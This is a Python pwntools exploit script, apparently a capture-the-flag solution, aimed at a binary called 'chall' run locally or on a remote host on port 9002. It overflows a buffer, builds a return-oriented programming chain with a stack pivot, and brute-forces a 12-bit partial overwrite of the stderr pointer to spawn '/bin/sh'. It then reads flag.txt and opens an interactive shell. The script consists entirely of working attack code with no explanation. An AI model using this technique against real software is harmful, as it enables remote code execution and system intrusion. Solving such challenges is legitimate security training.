#!/usr/bin/env python
from pwn import *

context.log_level = 'WARNING'

def connect():
    if len(sys.argv) == 1:
        return process('./chall')
    else:
        return remote('13.231.207.73', 9002)

elf = ELF('./chall')

p = log.progress('Brute forcing 12bits', level = 'WARNING')

count = 0
while True:
    count += 1
    p.status(hex(count))
    s = connect()

    pop_rdi = 0x40049c
    pop_rsi = 0x40049e
    leave = 0x400499

    payload = ''
    payload += 'A' * 0x20
    payload += p64(elf.symbols['stderr'] - 0x8)
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi) + p64(elf.bss(0x100))
    payload += p64(elf.symbols['read'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi) + p64(elf.symbols['stderr'])
    payload += p64(elf.symbols['read'])
    payload += p64(pop_rdi) + p64(elf.bss(0x100))
    payload += p64(leave)
    s.send(payload)

    time.sleep(0.1)
    s.send('/bin/sh\0')

    time.sleep(0.1)
    s.send('\x6a\x12\x4f')

    time.sleep(0.1)
    try:
        s.sendline('id')
        res = s.recv(4)
        if res is not None and res == 'uid=':
            break
    except Exception:
        pass
    s.close()

s.recvline()
s.sendline('cat flag.txt')
flag = s.recvline(False)
p.success('Got a flag: %s' % flag)
with open('flag', 'w') as f:
    f.write(flag)
s.interactive()
